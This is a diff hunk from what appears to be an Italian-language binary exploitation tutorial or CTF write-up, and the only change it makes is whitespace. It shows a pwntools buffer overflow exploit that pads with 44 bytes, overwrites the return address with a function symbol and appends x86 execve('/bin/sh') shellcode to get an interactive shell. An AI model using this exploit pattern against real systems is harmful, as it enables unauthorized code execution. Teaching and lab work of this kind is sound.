@@ -113,7 +113,7 @@ Ed ora abbiamo ciò che ci serve
 	garbage=b'A'*44
 	target=p32(e.symbols['lol'])
 	shellcode=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
-	payload=garbage + target + shellcode
+	payload=garbage + target +shellcode
 	p.sendline(payload)
 	p.interactive()
 	
